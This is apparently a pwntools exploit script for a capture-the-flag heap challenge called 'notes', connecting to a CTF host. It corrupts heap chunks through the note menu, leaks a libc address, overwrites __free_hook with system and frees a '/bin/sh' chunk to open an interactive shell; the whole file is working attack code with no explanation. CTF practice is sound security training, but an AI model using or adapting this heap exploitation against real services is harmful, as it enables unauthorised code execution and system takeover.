from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './notes'
HOST = 'ctf.cscml.zenysec.com'
PORT = 20006

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def create():
    r.sendlineafter('>>>', '1')

def write(idx, tlen, clen, t, c):
    r.sendlineafter('>>>', '2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(tlen))
    r.sendlineafter(': ', str(clen))
    r.sendlineafter(': ', str(t))
    r.sendlineafter(': ', str(c))

def edit(idx, t, c):
    r.sendlineafter('>>>', '3')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(t))
    r.sendlineafter(': ', str(c))

def show(idx):
    r.sendlineafter('>>>', '4')
    r.sendlineafter(':     ', str(idx))

def delete(idx):
    r.sendlineafter('>>>', '5')
    r.sendlineafter(': ', str(idx))


for i in range(30):
    create()

for i in range(20):
    write(i, 0x18, 0x18, (p64(0x21)*3)[:-1], (p64(0x21)*3)[:-1])

create()
for i in range(20, 30):
    write(i, 0x68, 0x18, (p64(0x21)*3)[:-1], (p64(0x21)*3)[:-1])
for i in range(10, 17):
    delete(i)
for i in range(20, 27):
    delete(i)

delete(0)
create()
write(0, 0x18, 0x18, 'A'*0x18+'\x11\x06', 'XXXX'*0x1)

delete(1)
create()
write(1, 0x28, 0x58, 'DDDD', flat(0,0,0))
show(2)

leak = u64(r.recv(8))
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')
system = base + 0x55410
mh = base + 0x1ebb70
fh = base + 0x1eeb28

for i in range(5):
    create()
write(30, 0x208, 0x238-0x80, 'AA', 'AA')

write(13, 0x38, 0x48, 'BB', 'BB')
write(14, 0x48, 0x28, flat(fh-0x10, 0x100, fh), 'A')
if args.D:
    debug(r, [0x1cd6, 0x1aa8, 0x1aed])
pause()
edit(30, '/bin/sh', p64(system))
delete(30)

r.interactive()

